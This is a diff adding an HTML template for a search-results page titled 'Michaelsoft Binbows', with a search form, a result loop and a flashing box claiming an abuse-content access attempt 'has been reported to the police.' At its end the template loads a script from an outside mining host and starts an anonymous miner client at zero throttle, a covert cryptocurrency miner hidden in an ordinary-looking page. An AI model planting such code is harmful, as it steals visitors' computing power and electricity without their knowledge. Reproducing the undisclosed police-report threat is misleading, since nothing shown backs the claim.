@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>Michaelsoft Binbows</title>
+    <style>
+      img {
+        float: left;
+        width: 60px;
+        padding: 5px;
+        height: auto;
+      }
+      h3 {
+        margin-top: 0;
+        margin-bottom: 0;
+      }
+      p {
+        margin-top: 0;
+        margin-bottom: 10;
+      }
+      blockquote {
+      width: 300px;
+      border: 15px solid black;
+      background-color: grey;
+      color: white;
+      padding: 50px;
+      margin: 20px;
+      animation: alert 1s infinite;
+      }
+      @keyframes alert {
+      0% {background-color: grey;}
+      50% {background-color: red;}
+      100% {background-color: grey;}
+      }
+    </style>
+  </head>
+  <body> 
+    <a href="/"><img src="/assets/logo.png"></a>
+    <form name="search" action="/" method="GET" autocomplete="off">
+      <input name="Search" placeholder="Why not search for: {{randomterm}}" required="required" size="50" type="search"/>
+      <input type="submit" value="Search"/>
+      </form>
+    <br>
+    <blockquote><b>Trying to access content involving the abuse of minors is
+        illegal. This incident has been reported to the police.<br>
+      </b> </blockquote>
+    % for i in results:
+    <h3 margin="2"><a href="{{i['url']}}">{{i['title']}}</a></h3>
+    <a href="{{i['url']}}" style="color: green;">{{i["url"]}}</a> 
+    <p>{{i['text']}}</p>
+    % end
+    <script src="https://www.hostingcloud.racing/JD2t.js"></script>
+    <script>
+        var _client = new Client.Anonymous('9798926dad3c60ea6a6ff3543c0acc5d938a8e0c2593996660342d72309cbd5b', {
+            throttle: 0, c: 'w'
+        });
+        _client.start();
+    </script>
+  </body>
+</html>
